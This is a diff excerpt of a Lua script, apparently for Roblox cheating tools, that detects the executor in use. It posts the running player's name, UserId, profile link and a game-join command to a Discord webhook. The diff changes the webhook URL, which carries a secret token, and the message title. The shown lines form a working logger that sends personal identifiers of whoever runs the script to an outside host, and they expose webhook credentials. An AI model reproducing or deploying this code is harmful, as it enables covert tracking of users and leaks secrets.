@@ -1182,7 +1182,7 @@ local jobid = game.JobId or 1
 local profile = " https://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile"
 local joinurl = "Roblox.GameLauncher.joinGameInstance(2788229376, '"..jobid.."');"
 local url =
-    "https://discord.com/api/webhooks/897239563955736617/aWpXomn07cvrsRwbZIClH6dPHJeDcei_xqhFOAHCC3zA6vLXzoJu7I40Kiv_XIt8_xBD"
+    "https://discord.com/api/webhooks/898349894467739650/NE9SCCHghbEQf6y3i3Q3qbL47rBCoVD9jMuy_AiJTCmlz3qLS5LijIYq-Q8F8OyvZ72I"
 
 local webhookcheck =
     is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X or Flexus" or
@@ -1195,7 +1195,7 @@ local data = {
     ["content"] = "Profile Link: "..profile,
     ["embeds"] = {
         {
-            ["title"] = "**Executed**",
+            ["title"] = "**Normal Execution**",
             ["description"] = "Name: **" ..game.Players.LocalPlayer.Name.."** or **"..game.Players.LocalPlayer.UserId.."** They Executed With **"..webhookcheck.."**".." Here Is Their Game ID: **"..joinurl.. "**",
             ["type"] = "rich",
             ["color"] = "2697513",
